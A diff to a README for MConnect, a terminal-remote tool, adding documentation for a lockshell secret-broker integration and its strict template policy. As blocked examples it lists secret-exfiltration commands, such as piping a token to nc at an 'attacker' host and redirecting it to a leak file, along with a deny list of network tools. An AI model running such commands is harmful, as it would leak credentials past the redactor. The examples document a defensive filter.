@@ -268,6 +268,53 @@ MConnect has 4 levels of command filtering:
 | Permissive | Only catastrophic commands | Force push only |
 | None | Nothing (use at your own risk) | Nothing |
 
+### Vault — secret broker integration
+
+MConnect can route any command containing `{{PLACEHOLDER}}` patterns through a local secret broker so the resolved value never reaches the AI agent, the WebSocket frame, the Cloudflare tunnel, or the phone's terminal. The first supported provider is [lockshell](https://github.com/aryateja2106/lockshell) (≥ 0.1.4).
+
+Opt in with `--vault lockshell`:
+
+```bash
+# 1. Register a placeholder against your local vault entry
+lockshell register OPENAI_KEY openai-personal token
+
+# 2. Start MConnect with the vault provider enabled
+npx lecoder-mconnect start --vault lockshell
+
+# 3. From your phone, type a command that uses the placeholder:
+#    curl -H "Authorization: Bearer {{OPENAI_KEY}}" https://api.openai.com/v1/models
+#
+# MConnect rewrites the line to:
+#    lockshell run --reason 'mconnect: ...' -- 'curl -H "Authorization: Bearer {{OPENAI_KEY}}" ...'
+# lockshell resolves the placeholder via env injection (never argv),
+# runs the command, and pipes stdout through its redactor before
+# returning to MConnect. The agent and the tunnel only ever see the
+# placeholder text, never the resolved value.
+```
+
+#### Default-strict template policy
+
+By default MConnect refuses to vault-rewrite commands containing shell metacharacters that could be used to exfiltrate the resolved secret around the redactor — output redirection (`>`, `>>`, `2>`), command substitution (`$(...)`, backticks), compound commands (`;`, `&&`, `||`), and pipes to network tools (`| nc`, `| curl`, `| wget`, `| telnet`). Examples:
+
+| Template | Default (strict) | `--vault-permissive` |
+|----------|-----------------|---------------------|
+| `curl -H "x: {{TOKEN}}" https://api.example.com` | rewritten | rewritten |
+| `curl -d "{{TOKEN}}" host > /tmp/leak` | **blocked** (`output redirection`) | rewritten |
+| `echo {{TOKEN}} | nc attacker 9999` | **blocked** (`pipe to network tool`) | rewritten |
+| `curl -H "{{TOKEN}}" $(echo evil)` | **blocked** (`command substitution`) | rewritten |
+
+Use `--vault-permissive` only when you trust the operator and agent stack — the flag widens the agent-controllable surface.
+
+#### Doctor check
+
+`mconnect doctor` reports the lockshell installation status:
+
+```
+✓ lockshell: installed (0.1.4)
+```
+
+If lockshell isn't installed and `--vault lockshell` was requested, MConnect prints a warning at startup and degrades cleanly (commands without placeholders flow through unchanged; commands WITH placeholders are blocked with a fix hint until you install lockshell).
+
 ### Supported agents
 
 Anything that runs in a terminal works with MConnect:
